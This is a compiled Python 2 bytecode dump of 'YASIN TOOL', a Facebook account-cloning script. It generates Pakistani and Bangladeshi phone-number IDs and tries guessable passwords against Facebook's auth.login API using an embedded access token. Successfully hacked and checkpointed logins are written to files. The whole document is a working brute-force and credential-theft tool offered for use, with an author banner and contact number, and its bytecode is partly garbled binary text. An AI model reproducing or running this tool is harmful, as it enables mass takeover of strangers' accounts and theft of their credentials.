ó
>Џbc           @   sJ  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z e  j d  xJ e
 d  D]< Z e j d d  Z e d d  e _ e GHe j j   qª Wy d  d l Z Wn e k
 re  j d  n Xy d  d l Z Wn8 e k
 ree  j d	  e j d
  e  j d  n Xd  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d
 l m Z d  d l m Z e e  e j d  e j   Z e j  e!  e j" e j# j$   d d
 d& g e _% d' g e _% d   Z& d   Z' d   Z( d   Z) d Z* g  a+ g  Z, g  a- d Z. d Z/ e  j d  d Z0 d   Z1 d   Z2 d    Z3 d!   Z4 d"   Z5 d#   Z6 d$   Z7 e8 d% k rFe2   n  d S((   iÿÿÿÿNs   rm -rf .txti0u  iGô i s   .txtt   as   pip2 install mechanizes   pip2 install requesti   s   Then type: python2 YASIN.py(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_times
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   /sdcard/pak_bang.pyt   acak&   s
    
0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q
 W| d 7} | j d d  } t j j | d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strt   syst   stdoutt   write(   R   R   R   t   jR	   (    (    s   /sdcard/pak_bang.pyR
   /   s    
(
c         C   sG   x@ |  d D]4 } t  j j |  t  j j   t j d d  q Wd  S(   Ns   
g      @iÈ   (   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   /sdcard/pak_bang.pyt   jalan:   s    
c          C   sR   d d d d d d d g }  x0 |  D]( } d | Gt  j j   t j d  q" Wd  S(   Ns      s   .  s   .. s   ...s;   
[1;91m     [●] [1;92mYASIN TOOL Loa[1;90mding [1;97mg      à?(   R   R   R   R   R   (   t   titikt   o(    (    s   /sdcard/pak_bang.pyt   tikA   s
    

i    s
   [31mNot Vulns	   [32mVulnt   clearsT  
[1;91m   _____  ____ ___ _   _ 
\ \ / / _ \/ ___|_ _| \ | |
 \ V / |_| \___ \| ||  \| |
  | ||  _  |___) | || |\  |
  |_||_| |_|____/___|_| \_|
                           
[1;92m
[1;93m
[1;94m  AUTHOR MUHAMMAD YASIN
[1;95m
[1;96m  WHATSPP 03305867095
[1;98m

  [1;41m[1;92mYASIN MR CHOKRA TH3 BR4ND HATERX MAKES MEH FAMOUS[1;0m'
c           C   s   t  j d  t   d  S(   NR#   (   t   ost   systemt   login(    (    (    s   /sdcard/pak_bang.pyt   lisensi`   s    
c           C   s-   t  j d  t GHHd GHd GHd GHt   d  S(   NR#   s   [1;92m(1) Pakistan Clonings   [1;97m(2) Bangladesh Clonings   [1;97m(0) Back(   R$   R%   t   logo1t
   pilih_Somi(    (    (    s   /sdcard/pak_bang.pyR&   e   s    
c          C   sW   t  d  }  |  d k r' d GHt   n, |  d k r= t   n |  d k rS t   n  d  S(   Ns   
[1;95m•➢ [1;96mR   s   [1;97mFill In Correctlyt   1t   2(   t	   raw_inputt   pilih_logint   pR   (   t   Somi(    (    s   /sdcard/pak_bang.pyR)   o   s    

c           C   s$   t  j d  t GHHHd GHt   d  S(   NR#   s   Do you want countinue [y/n](   R$   R%   R(   t   act(    (    (    s   /sdcard/pak_bang.pyR.   z   s    
c             s  t  d  }  |  d k r' d GHt   nã |  d k rè t   t j d  t GHHd GHd GHd GHd	 GHd
 GHd GHHyO t  d    d
  d } x0 t | d  j   D] } t j	 | j
    q WWq
t k
 rä d GHt  d  |    q
Xn" |  d k rþ t   n d GHt
   d d GHt t t   } t d |  t d  d d GH   f d   } t d  } | j | t  d d GHd GHt  d  t   d  S(   Ns   

 [1;97m  R   s   [!] Fill in correctlyt   yR#   s   [1;93mSELECT SIM CODEs$   [1;92m00,01,02,03,04,05,06,07,08,09s   [1;92m11,12,13,14,15,16,17,18s   [1;92m21,22,23,24s   [1;92m30,31,32,33,34,35,36s$   [1;92m40,41,42,43,44,45,46,47,48,49s   >>> t   03s   .txtt   rs   [!] File Not Founds	   
[ Back ]t   ns   [!] Fill In Correctlyi/   s   [1;93m-s   [1;96m TOTAL IDS NUMBER : s.   [1;93m TO STOP THIS PROCESS PRESS Ctrl THEN zc   	         s·  |  } y t  j d  Wn t k
 r* n Xy~| } t j d    | d | d  } t j |  } d | k rÝ d    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nËd | d k rTd
    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  nT   | } t j d    | d | d  } t j |  } d | k rd    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nd | d k rd
    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n&d } t j d    | d | d  } t j |  } d | k r1d    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nw d | d k r¨d
    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n  Wn n Xd  S(   Nt   saves   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt   access_tokens3   [1;93m   (YASIN-HAC[1;92mKED)[1;91m ●  [1;97ms   [1;91m ● [1;95ms   sdcard/ids/successful.txtR    s   
s   www.facebook.comt	   error_msgs5   [1;92m   (YASIN-[1;97mCP[1;93m)[1;91m ● [1;97ms   [1;91m ● [1;96m s   sdcard/ids/checkpoint.txts   @@123@@(   R$   t   mkdirt   OSErrort   brt   opent   jsont   loadR   t   closet   okst   appendt   cpb(	   t   argt   usert   pass1t   datat   qt   okbt   cpst   pass2t   pass3(   t   ct   k(    s   /sdcard/pak_bang.pyt   main«   sj    
'

'

'

i   i2   s   [1;91m-s   Process Has Been Completed ...s   
[1;92m[[1;92mBack[1;95m](   R,   R0   R"   R$   R%   R(   R;   t	   readlinest   idR@   t   stript   IOErrorR&   t   actionR   R   R   R   t   map(   t   somit   idlistt   linet   xxxRM   R.   (    (   RK   RL   s   /sdcard/pak_bang.pyR0      sT    




	
	<	
c           C   s$   t  j d  t GHHHd GHt   d  S(   NR#   s   Do you want countinue [y/n](   R$   R%   R(   RR   (    (    (    s   /sdcard/pak_bang.pyR   ï   s    
c             s¡  t  d  }  |  d k r' d GHt   nÄ |  d k rÉ t   t j d  t GHHyO t  d    d  d } x0 t | d	  j   D] } t j	 | j
    q~ WWqë t k
 rÅ d
 GHt  d  |    që Xn" |  d k rß t   n d
 GHt   d d GHt
 t t   } t d |  t d  d d GH   f d   } t d  } | j | t  d d GHd GHd t
 t t   d t
 t t   GHt  d  t   d  S(   Ns   

 [1;97m  R   s   [!] Fill in correctlyR1   R#   sh   TYPE ANY 3 DIGIT NUMBER 

     [1;94m[1;96m
175,165,191, 192, 193, 194,
195, 196, 197, 198, 199:
 >>> s   +880s   .txtR3   s   [!] File Not Founds	   
[ Back ]R4   s   [!] Fill In Correctlyi/   s   [1;93m-s   [1;96m TOTAL IDS NUMBER : s.   [1;93m TO STOP THIS PROCESS PRESS Ctrl THEN zc   
         sÕ  |  } y t  j d  Wn t k
 r* n Xy| } t j d    | d | d  } t j |  } d | k rÝ d    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  néd | d k rTd
    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  nrd } t j d    | d | d  } t j |  } d | k rd    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nÃd | d k rzd    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  nLd } t j d    | d | d  } t j |  } d | k r)d    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nd | d k r d
    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n&d }	 t j d    | d |	 d  } t j |  } d | k rOd    | d |	 GHt d d	  } | j    | |	 d
  | j   t	 j
   | |	  nw d | d k rÆd
    | d |	 GHt d d	  } | j    | |	 d
  | j   t j
   | |	  n  Wn n Xd  S(   NR5   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmR6   s3   [1;93m   (YASIN-HAC[1;92mKED)[1;91m ●  [1;97ms   [1;91m ● [1;95ms   sdcard/ids/successful.txtR    s   
s   www.facebook.comR7   s5   [1;92m   (YASIN[1;97m-CP[1;93m)[1;91m ● [1;97ms   [1;91m ● [1;96m s   sdcard/ids/checkpoint.txtt
   bangladeshs5   [1;92m   (YASIN-[1;97mCP[1;93m)[1;91m ● [1;97mt   102030t   445566(   R$   R8   R9   R:   R;   R<   R=   R   R>   R?   R@   RA   (
   RB   RC   RD   RE   RF   RG   RH   RI   RJ   t   pass4(   RK   RL   (    s   /sdcard/pak_bang.pyRM     s    
'

'

'

'

i   i2   s   [1;91m-s   Process Has Been Completed ...s   Total Online/Offline : t   /s   
[1;92m[[1;92mBack[1;95m](   R,   RR   R"   R$   R%   R(   R;   RN   RO   R@   RP   RQ   R&   R   R   R   R   RS   R?   RA   (   RT   RU   RV   RW   RM   R.   (    (   RK   RL   s   /sdcard/pak_bang.pyRR   ø   sH    




	
	J	)
t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](9   R$   R   R   t   datetimeR
   t   hashlibt   ret	   threadingR<   t   urllibt	   cookielibt   getpassR%   t   rangeR4   R   t   nmbrR;   R   R   t   requestst   ImportErrort	   mechanizeR   t   multiprocessing.poolR   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingR:   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R
   R   R"   t   backR?   RO   RA   t   vulnott   vulnR(   R'   R&   R)   R.   R0   R   RR   t   __name__(    (    (    s   /sdcard/pak_bang.pyt   <module>   s`   







					
		
				l			t


	yasino